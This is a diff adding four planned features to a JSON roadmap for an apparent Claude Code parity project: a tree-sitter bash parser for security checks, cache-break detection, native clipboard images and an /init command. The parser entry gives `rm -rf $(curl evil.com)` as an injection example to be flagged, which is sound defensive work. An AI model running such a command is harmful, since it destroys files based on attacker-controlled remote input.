@@ -8811,6 +8811,58 @@
       "model": "sonnet",
       "effort": "medium",
       "updated": "2026-06-09"
+    },
+    {
+      "id": "CC-TREE-SITTER-BASH",
+      "track": "Claude Code parity",
+      "title": "Tree-sitter bash parser \u2014 AST-accurate security validation for bash commands",
+      "status": "next",
+      "size": "M",
+      "summary": "CC (feature-gated `TREE_SITTER_BASH`) uses a tree-sitter-based AST parser for bash commands alongside (or replacing) the regex parser. Provides structurally accurate analysis of compound commands, pipelines, subshells \u2014 catching injection patterns that regex misses. `TREE_SITTER_BASH_SHADOW` runs both and compares for gradual rollout.",
+      "done": "With tree-sitter bash enabled, `rm -rf $(curl evil.com)` is correctly parsed as a command substitution and flagged. Regex shadow mode logs discrepancies.",
+      "tier": "pebble",
+      "model": "sonnet",
+      "effort": "medium",
+      "updated": "2026-06-09"
+    },
+    {
+      "id": "CC-PROMPT-CACHE-BREAK",
+      "track": "Claude Code parity",
+      "title": "Prompt cache break detection \u2014 detect invalidation, trigger microcompact cleanup",
+      "status": "next",
+      "size": "S",
+      "summary": "CC (feature-gated `PROMPT_CACHE_BREAK_DETECTION`) detects when the Anthropic API prompt cache is invalidated (cache miss after a hit sequence). On detection, triggers cleanup: subagents are notified via `notifyCompaction`, and /compact can respond reactively. Prevents unnecessary re-billing from repeated cache misses.",
+      "done": "When the cache breaks mid-session, a microcompact runs to shrink the prompt before the next request, avoiding a large uncached prefix resend.",
+      "tier": "sand",
+      "model": "sonnet",
+      "effort": "low",
+      "updated": "2026-06-09"
+    },
+    {
+      "id": "CC-NATIVE-CLIPBOARD",
+      "track": "Claude Code parity",
+      "title": "Native clipboard image \u2014 capture images without external tools (xclip/pbpaste)",
+      "status": "next",
+      "size": "S",
+      "summary": "CC (feature-gated `NATIVE_CLIPBOARD_IMAGE`) uses native OS clipboard APIs for image capture instead of shelling out to `xclip`/`xsel` (Linux) or `pbpaste` (macOS). Faster, works in environments where clipboard tools aren't installed, and avoids subprocess overhead.",
+      "done": "Pasting an image from clipboard works on Linux even without xclip installed. `/paste` and auto-detect both use the native API path.",
+      "tier": "sand",
+      "model": "sonnet",
+      "effort": "low",
+      "updated": "2026-06-09"
+    },
+    {
+      "id": "CC-INIT-CMD",
+      "track": "Claude Code parity",
+      "title": "`/init` command \u2014 generate a CLAUDE.md project context file",
+      "status": "next",
+      "size": "M",
+      "summary": "CC has an `/init` command that analyzes the current project and generates a `CLAUDE.md` file with discovered context: tech stack, key files, coding conventions, and setup instructions. `NEW_INIT` is an improved variant that generates richer context. The file primes future Claude sessions on this project.",
+      "done": "Running `/init` in a new project generates `.claude/CLAUDE.md` with detected stack, file structure, and conventions. Future sessions load this automatically.",
+      "tier": "pebble",
+      "model": "sonnet",
+      "effort": "medium",
+      "updated": "2026-06-09"
     }
   ]
 }
